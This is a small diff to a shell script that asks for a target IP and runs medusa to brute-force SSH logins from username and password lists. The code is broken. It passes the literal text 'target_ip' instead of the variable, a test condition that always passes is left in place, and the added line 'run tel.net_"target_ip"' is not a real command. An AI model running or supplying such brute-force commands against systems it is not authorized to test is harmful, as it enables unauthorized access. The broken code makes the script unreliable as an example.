@@ -11,8 +11,9 @@ if [ "question"="y" ]; then
 fi
 
 # Prompt user for input
-read -p "What is your target ip?"
-
+read -p "What is your target ip?" target_ip
 
 # Run this commands with the target_ip provided
-medusa -h "target-ip" -U usernames.txt -P password_list.txt -M ssh
+medusa -h "target_ip" -U usernames.txt -P password_list.txt -M ssh
+
+run tel.net_"target_ip"
